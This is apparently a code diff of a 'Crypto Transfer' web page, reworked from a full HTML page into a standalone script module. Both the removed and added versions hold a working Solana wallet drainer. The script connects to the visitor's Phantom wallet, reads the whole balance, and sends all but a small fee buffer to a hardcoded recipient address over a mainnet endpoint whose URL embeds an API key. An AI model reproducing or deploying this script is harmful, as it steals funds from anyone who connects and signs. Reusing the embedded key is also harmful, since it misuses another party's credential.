@@ -1,75 +1,69 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Transfer</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"></script>
-</head>
-<body>
-    <h2>Click below to transfer all funds</h2>
-    <button id="transferBtn">Transfer Now</button>
+<script type="module">
+    import { Connection, PublicKey, Transaction, SystemProgram } from 'https://cdn.jsdelivr.net/npm/@solana/web3.js/+esm';
 
-    <script type="module">
-        import { Connection, PublicKey, Transaction, SystemProgram } from 'https://cdn.jsdelivr.net/npm/@solana/web3.js/+esm';
+    window.Buffer = window.buffer.Buffer; // Fix for Buffer error
 
-        window.Buffer = window.buffer.Buffer;  // Fix for Buffer error
+    const recipientWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
+    const connection = new Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df");
 
-        const recipientWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
-        const connection = new Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df");
-
-        document.getElementById('transferBtn').addEventListener('click', async () => {
-            console.log("Button clicked!");
-
-            try {
-                const provider = window.phantom?.solana;
-                if (!provider || !provider.isPhantom) {
-                    alert('Phantom Wallet not found. Please install and log in.');
-                    return;
-                }
-
-                console.log("Connecting to Phantom Wallet...");
-                const response = await provider.connect();
-                console.log("Wallet connected: ", response.publicKey.toString());
-
-                const senderPublicKey = new PublicKey(response.publicKey.toString());
-
-                console.log("Fetching balance...");
-                const balance = await connection.getBalance(senderPublicKey);
-                console.log(`Balance: ${balance}`);
-
-                if (balance <= 0) {
-                    alert('Insufficient SOL balance to complete the transaction.');
-                    return;
-                }
-
-                console.log("Preparing transaction...");
-                const transaction = new Transaction().add(
-                    SystemProgram.transfer({
-                        fromPubkey: senderPublicKey,
-                        toPubkey: new PublicKey(recipientWallet),
-                        lamports: balance - 5000,  // Deducting fee buffer
-                    })
-                );
-
-                transaction.feePayer = senderPublicKey;
-                const { blockhash } = await connection.getLatestBlockhash();
-                transaction.recentBlockhash = blockhash;
-
-                console.log("Signing transaction...");
-                const signedTransaction = await provider.signTransaction(transaction);
-
-                console.log("Sending transaction...");
-                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-
-                alert(`Transaction sent: https://explorer.solana.com/tx/${signature}?cluster=mainnet`);
-                console.log("Transaction complete!");
-
-            } catch (error) {
-                console.error("Transaction error:", error);
-                alert(`Error: ${error.message}`);
+    async function connectPhantomWallet() {
+        try {
+            if (window.phantom?.solana && window.phantom?.solana.isPhantom) {
+                console.log("Phantom wallet detected.");
+                const provider = window.phantom.solana;
+                await provider.connect();
+                return provider.publicKey.toString();
+            } else {
+                alert("Phantom wallet not detected. Please install it.");
+                return null;
             }
-        });
-    </script>
-</body>
-</html>
+        } catch (error) {
+            console.error("Wallet connection failed:", error);
+            alert("Error connecting to wallet. Please try again.");
+            return null;
+        }
+    }
+
+    async function transferFunds() {
+        const senderPublicKey = await connectPhantomWallet();
+        if (!senderPublicKey) return;
+
+        try {
+            console.log("Fetching balance...");
+            const balance = await connection.getBalance(new PublicKey(senderPublicKey));
+            console.log(`SOL Balance: ${balance / 1e9} SOL`);
+
+            if (balance <= 5000) {
+                alert('Insufficient SOL balance for transaction fees.');
+                return;
+            }
+
+            console.log("Preparing transaction...");
+            const transaction = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: new PublicKey(senderPublicKey),
+                    toPubkey: new PublicKey(recipientWallet),
+                    lamports: balance - 5000, // Deduct small buffer for fees
+                })
+            );
+
+            transaction.feePayer = new PublicKey(senderPublicKey);
+            const { blockhash } = await connection.getLatestBlockhash();
+            transaction.recentBlockhash = blockhash;
+
+            console.log("Signing transaction...");
+            const provider = window.phantom.solana;
+            const signedTransaction = await provider.signTransaction(transaction);
+
+            console.log("Sending transaction...");
+            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+            
+            alert(`Transaction sent! Check status here: https://explorer.solana.com/tx/${signature}?cluster=mainnet`);
+        } catch (error) {
+            console.error("Transaction failed:", error);
+            alert(`Error: ${error.message}`);
+        }
+    }
+
+    document.getElementById('transferBtn').addEventListener('click', transferFunds);
+</script>
